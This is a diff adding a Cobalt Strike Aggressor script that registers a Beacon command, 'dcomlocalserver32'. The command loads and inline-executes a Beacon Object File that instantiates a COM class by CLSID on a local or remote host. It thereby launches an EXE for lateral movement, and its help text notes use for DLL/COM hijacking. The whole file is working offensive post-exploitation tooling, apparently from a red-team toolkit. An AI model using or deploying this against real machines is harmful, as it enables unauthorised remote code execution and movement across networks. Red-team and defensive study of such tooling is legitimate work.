@@ -1,0 +1,40 @@
+# author Western Tactics
+
+beacon_command_register(
+	"dcomlocalserver32", "Instantiate a DCOM/COM class and start an EXE on a (remote) machine.",
+	"INFO:\nThis technique can instantiate a DCOM/COM class for a provided CLSID on a specified target machine (locally, or remotely via DCOM). On the target machine, the COM Service Control Manager (SCM) resolves the CLSID’s LocalServer32 registration and launches the associated out-of-process EXE server, creating a separate process.\nReminder: If used for DLL/COM hijacking, place the proxy (COM) DLL in the correct location before running this tool.\n\n" .
+	"ARGUMENTS:\n[<CLSID>]: The CLSID of the COM class that is associated with the vulnerable process.\n[<target>]: The FQDN, hostname or IP of the target host (can be remote- or the local host).\n\n" .
+	"USAGE:\ndcomlocalserver32 <CLSID> <target>\n\n" .
+	"EXAMPLES:\ndcomlocalserver32 {73FDDC80-AEA9-101A-98A7-00AA00374959} target.example.local\n\n");
+	
+alias dcomlocalserver32 {
+    $bid = $1;
+    $clsid = $2;
+    $target = $3;
+
+    if ($clsid eq "") {
+        berror($bid, "Please specify CLSID of target DCOM class.\n");
+        return;
+    }
+
+    if ($target eq "") {
+		berror($bid, "Please specify target system.\n");
+		return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("dcomlocalserver32.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "ZZ", $clsid, $target);
+
+    blog($bid, "Tasked to instantiate a DCOM/COM class..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
